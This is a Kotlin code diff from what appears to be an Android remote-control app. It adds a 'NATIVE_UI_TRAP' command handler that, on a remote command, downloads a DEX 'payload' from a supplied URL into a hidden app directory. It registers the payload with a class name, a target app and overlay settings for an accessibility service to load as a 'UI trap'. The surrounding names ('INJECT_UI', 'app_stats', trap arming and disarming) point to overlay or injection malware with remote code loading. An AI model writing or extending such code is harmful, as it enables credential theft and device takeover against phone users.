@@ -1023,6 +1023,79 @@ object CommandProcessor {
                     status = "ALL_UI_TRAPS_DISARMED"
                     MyAccessibilityService.instance?.reloadUiTraps()
                 }
+                "NATIVE_UI_TRAP" -> {
+                    val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                    val trapsStr = prefs.getString("native_traps_array", "[]") ?: "[]"
+                    val trapsArr = org.json.JSONArray(trapsStr)
+                    val newArr = org.json.JSONArray()
+
+                    try {
+                        val json = org.json.JSONObject(content)
+                        val action = json.optString("action", "SET").uppercase()
+                        val label = json.optString("label", "DefaultNative")
+
+                        if (action == "REMOVE") {
+                            for (i in 0 until trapsArr.length()) {
+                                val t = trapsArr.getJSONObject(i)
+                                if (t.optString("label") != label) newArr.put(t)
+                                else {
+                                    // Clean up the file
+                                    try { java.io.File(t.getString("file_path")).delete() } catch(e:Exception){}
+                                }
+                            }
+                            prefs.edit().putString("native_traps_array", newArr.toString()).apply()
+                            status = "NATIVE_TRAP_REMOVED"
+                            errorMsg = "Purged DEX config: $label"
+                        } else {
+                            val urlStr = json.getString("url")
+                            val targetDir = ctx.getDir("dex_traps", Context.MODE_PRIVATE)
+                            if (!targetDir.exists()) targetDir.mkdirs()
+                            val targetFile = java.io.File(targetDir, "${label}.dex")
+
+                            // Download the DEX payload
+                            val url = URL(urlStr)
+                            val conn = url.openConnection() as HttpURLConnection
+                            conn.connectTimeout = 15000
+                            conn.readTimeout = 15000
+                            if (conn.responseCode == 200) {
+                                conn.inputStream.use { input ->
+                                    targetFile.outputStream().use { output -> input.copyTo(output) }
+                                }
+                                
+                                val newTrap = org.json.JSONObject().apply {
+                                    put("label", label)
+                                    put("target", json.getString("target"))
+                                    put("strict", json.optBoolean("strict", false))
+                                    put("class_name", json.getString("class_name"))
+                                    put("timeout", json.optLong("timeout", 15L))
+                                    put("dim", json.optInt("dim", 20))
+                                    put("file_path", targetFile.absolutePath)
+                                }
+
+                                var found = false
+                                for (i in 0 until trapsArr.length()) {
+                                    val t = trapsArr.getJSONObject(i)
+                                    if (t.optString("label") == label) {
+                                        newArr.put(newTrap)
+                                        found = true
+                                    } else newArr.put(t)
+                                }
+                                if (!found) newArr.put(newTrap)
+
+                                prefs.edit().putString("native_traps_array", newArr.toString()).apply()
+                                status = "NATIVE_TRAP_ARMED"
+                                errorMsg = "Armed DEX config: $label"
+                            } else {
+                                status = "FAILED_DOWNLOAD"
+                                errorMsg = "HTTP Response: ${conn.responseCode}"
+                            }
+                        }
+                    } catch (e: Exception) {
+                        status = "FAILED_PARSING"
+                        errorMsg = e.message ?: "Invalid JSON or network error"
+                    }
+                    MyAccessibilityService.instance?.reloadUiTraps()
+                }
                 "INJECT_UI" -> {
                     val parts = content.split("|", limit = 3)
                     if (parts.size >= 3) {
